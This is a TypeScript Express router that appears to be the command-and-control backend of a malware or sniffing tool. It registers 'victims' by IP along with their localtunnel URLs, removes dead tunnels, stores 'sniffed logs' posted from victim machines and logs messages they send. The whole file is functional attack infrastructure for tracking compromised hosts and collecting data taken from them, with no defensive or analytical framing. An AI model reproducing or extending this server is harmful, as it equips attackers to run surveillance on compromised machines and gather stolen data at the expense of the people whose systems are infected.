import { Request, Response, Router } from 'express';
import db from '../db';
import { Victim } from '../db/types';

// Init router
const router = Router();

/* * Router Endpoints * */
// NOTE: IP is primary key

// TODO: Do query victim by IP

router.get('/', (req: Request, res: Response) => {
  const { ip } = req.query;
  let index: number = -1;
  try {
    index = db.getIndex('/victims', ip as string, 'ip');
  } catch (err) {
    console.error(err);
    return res.status(400).send();
  }
  const victim = db.getObject<Victim>(`/victims[${index}]`);
  return res.status(200).json(victim);
});

/**
 * Add/Upsert new victim
 */
router.post('/', (req: Request, res: Response) => {
  const { url, ip, createdAt, type } = req.body;
  // Check if DB has not been init &&
  let index: number = -1;
  try {
    index = db.getIndex('/victims', ip, 'ip');
  } catch (err) {
    if (!err.message.startsWith("Can't find dataPath")) {
      console.error(err);
      return res.status(400).send();
    }
  }
  // Upsert URL if victim has already existed
  if (index !== -1) {
    db.push(
      `/victims[${index}]`,
      {
        url,
      },
      false
    );
    console.info(
      `[${new Date().toLocaleString()}] [Victim] - ${url} has been updated for the existing victim in DB`
    );
    return res.status(200).send();
  }
  // Insert brand new victim
  db.push(
    '/victims[]',
    {
      url,
      ip,
      type,
      createdAt,
    },
    true
  );
  console.info(
    `[${new Date().toLocaleString()}] [Victim] - ${url} has been saved to DB`
  );
  return res.status(200).send();
});

/**
 * Remove localtunnel's URL off Victim collection
 */
router.delete('/tunnels', (req: Request, res: Response) => {
  const { tunnelURL } = req.query;
  // Find and Delete by Tunnel's URL
  try {
    db.delete(
      `/victims[${db.getIndex('/victims', tunnelURL as string, 'url')}]`
    );
  } catch (err) {
    console.error(err);
    return res.status(400).send();
  }
  console.info(
    `[${new Date().toLocaleString()}] [Victim] - Victim at ${tunnelURL} is removed from the DB`
  );
  return res.status(200).send();
});

/**
 * Add the sniffed logs from victim
 */
router.post('/logs', (req: Request, res: Response) => {
  const { victimIP } = req.query;
  const { log } = req.body;
  // Parse log
  const parsedLog = JSON.parse(log);
  // Output log
  console.info(
    `[${new Date().toLocaleString()}] [Victim] [${victimIP}] - ${log}`
  );
  // Save to log by IP
  let index: number = -1;
  try {
    index = db.getIndex('/victims', victimIP as string, 'ip');
  } catch (err) {
    if (!err.message.startsWith("Can't find dataPath")) {
      console.error(err);
      return res.status(400).send();
    }
  }
  // Init new log collection
  if (index !== -1) {
    db.push(
      `/victims[${index}]/logs[]`,
      {
        ...parsedLog,
      },
      true
    );
  }
  return res.status(200).send();
});

/**
 * Receive messages from victim machine
 */
router.post('/msg', (req: Request, res: Response) => {
  const { msg } = req.body;
  console.info(`[${new Date().toLocaleString()}] [Victim] - ${msg}`);
  return res.status(200).send();
});

export default router;
